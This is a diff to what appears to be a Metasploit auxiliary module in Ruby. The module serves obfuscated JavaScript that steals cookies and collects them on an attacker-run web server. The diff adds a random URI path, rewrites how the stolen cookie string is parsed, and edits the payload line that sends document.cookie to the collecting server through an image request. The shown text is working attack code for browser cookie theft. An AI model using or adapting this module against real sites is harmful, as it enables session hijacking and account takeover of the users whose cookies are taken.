@@ -37,21 +37,24 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def run
+		if datastore['URIPATH'] == nil
+			datastore['URIPATH'] = Rex::Text.rand_text_alpha(rand(10) + 4)
+		end
+
 		exploit
 	end
 
-	# This handles the HTTP responses for the Web server
+	#parse request and respond with 404
 	def on_request_uri(cli, request)
 
 		base_url = generate_base_url(cli, request)
 		status_message = ""
-
 		case request.uri
 		when /\.js(\?|$)/
 			content_type = "text/plain"
 			send_response(cli, generate_js(base_url), {'Content-Type'=> content_type, })
-		when /\/data\/(.*)/
-			cookies = request.uri.to_s[6..-1].split(';')
+		when /#{datastore['URIPATH']}\/{0,1}data\/(.*)/
+			cookies = request.uri.to_s[datastore['URIPATH'].length+7..-1].split(';')
 			cookiesh = Hash.new()
 			cookies.each do |item|
 				a,b = item.split('=')
@@ -120,7 +123,7 @@ class Metasploit3 < Msf::Auxiliary
 	#Generation and obfuscation of javascript
 	def generate_js(base_url)
 		code = ::Rex::Exploitation::JSObfu.new %Q|
-		new Image().src="#{base_url}data/"+document.cookie;|
+		new Image().src="#{base_url}/data/"+document.cookie;|
 
 		if datastore['OBFUSCATE_JAVASCRIPT']
 			code.obfuscate
